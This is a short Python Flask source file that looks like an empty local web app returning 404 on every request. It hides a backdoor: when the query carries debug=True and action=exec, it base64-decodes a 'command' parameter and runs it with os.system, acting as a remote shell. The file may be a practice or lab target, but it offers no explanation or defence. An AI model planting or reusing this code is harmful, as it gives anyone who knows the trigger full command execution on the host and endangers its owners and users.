from flask import Flask, request, abort, make_response
import os
import base64

localapp = Flask(__name__)

@localapp.route('/')
def index():
    if request.args.get("debug") == "True" and request.args.get("action") == "exec":
    	command = request.args.get("command")
    	os.system(base64.b64decode(command))
    	return make_response("Executed!", 200)
    else:
    	abort(404)

#
# Localhost port 5000
#

if __name__ == '__main__':
    localapp.run()